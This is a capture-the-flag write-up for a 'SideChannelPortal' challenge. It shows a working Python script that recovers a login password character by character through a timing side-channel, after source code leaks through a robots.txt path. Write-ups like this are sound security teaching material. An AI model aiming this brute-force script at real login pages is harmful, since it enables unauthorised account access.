### 0x00 Challenge: SideChannelPortal
**Description:**
>Have you heard about side-channel attacks? https://en.wikipedia.org/wiki/Side-channel_attack
>
>URL: http://168.119.247.237:5003/

### 0x01 Write-up:
The login in the URL is vulnerable to Timing Attack. In robots.txt a "/code" path is found that leaks the source code.

![](https://i.imgur.com/K8IMWZc.png)

You can automatize the task to get the password or test manually.

**Script to get the password:**
```python
#!/usr/bin/python3

import requests
from datetime import timedelta

final_password = ""

while len(final_password) < 8:
    for ch in "0123456789abcdefghijklmnopqrstuvwxyz":
        try:
            burp0_url = "http://168.119.247.237:5003/login"
            burp0_headers = {"Cache-Control": "max-age=0", "DNT": "1", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36", "Origin": "http://168.119.247.237:5003", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://168.119.247.237:5003/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,es;q=0.8", "Connection": "close"}
            burp0_data = {"password": final_password + ch, "submit": "Enviar"}
            r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
            print ("Testing: " + final_password + ch)

            if r.elapsed.total_seconds() < 0.8:
                final_password += ch
                break
        except:
            pass

print ("Password is: " + final_password)
```

You only need to login to get the flag

![](https://i.imgur.com/dDXbDEV.png)
